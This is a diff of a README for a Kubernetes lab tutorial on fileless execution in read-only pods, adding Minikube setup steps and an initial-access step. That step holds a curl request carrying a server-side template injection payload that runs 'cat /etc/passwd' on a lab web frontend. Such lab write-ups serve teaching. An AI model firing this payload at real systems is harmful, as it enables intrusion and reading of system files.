@@ -4,15 +4,13 @@
 [![N|Solid](./images/fileless_main.png)]
 
  **Table of content:**
+ - [Lab Setup](#item-zero)
  - [Exploring the Read-Only Web Frontend](#item-one)
  - [Dealing with Read-Only File System](#item-two)
  - [Introduction to fee](#item-three)
  - [Interacting with postgesql](#item-five)
  - [Playing with kube-api insite a pod with `cluster-admin`](#item-six)
  
-### Lab Setup: Docker and Minikube are used as the infrastructe to make the lab as portable as postible.
-
-
 ## Synopsis
 
 In this tutorial, we'll explore the concept of fileless execution within Kubernetes environments, particularly focusing on pods deployed with read-only root file systems. This technique is crucial for scenarios where traditional file manipulation is restricted, offering an alternative method for executing tasks.
@@ -21,9 +19,6 @@ In this tutorial, we'll explore the concept of fileless execution within Kuberne
 - Linux Enumeration
 - Kubernetes Enumeration
 - Elf x86 binary knowlage 
-<a id="item-one"></a>
-## Step 1: Exploring the Read-Only Web Frontend
-First, we access the web frontend 
 
 ## Skills Learned
 - Docker workflows
@@ -31,8 +26,26 @@ First, we access the web frontend
 - Kubernetes defaults
 - Kubernetes privilages escalations  
 
+## Lab Setup:
+<a id="item-zero"></a>
+Docker and Minikube are used as the infrastructe to make the lab as portable as possible.
+[![N|Solid](./images/lab.png)]
+```sh
+cd k8syamls/
+make launch-minikube
+make deploy
+```
 ## Step 1: Gain access to Kubernetes cluster Via web frontend 
+<a id="item-one"></a>
+## Step 1: Exploring the Read-Only Web Frontend
+First, we access the web frontend and exploit a SSTI to gain a foot hold on the system.
 
+```sh
+curl -i -s -k -X $'POST' \
+    -H $'Host: 192.168.64.18:30007' -H $'Content-Length: 153' -H $'Cache-Control: max-age=0' -H $'Upgrade-Insecure-Requests: 1' -H $'Origin: http://192.168.64.18:30007' -H $'Content-Type: application/x-www-form-urlencoded' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H $'Referer: http://192.168.64.18:30007/get_response' -H $'Accept-Encoding: gzip, deflate, br' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' \
+    --data-binary $'conversation=A&user_input=a+%7B%7B+self._TemplateReference__context.cycler.__init__.__globals__.os.popen%28%27cat+%2Fetc%2Fpasswd%27%29.read%28%29+%7D%7D' \
+    $'http://192.168.64.18:30007/get_response'
+```
 ## Step 2: Enumerating our envioment 
 
 By checking the envoroment variables we can deduce that we are in a Kubernetes enviorment. 
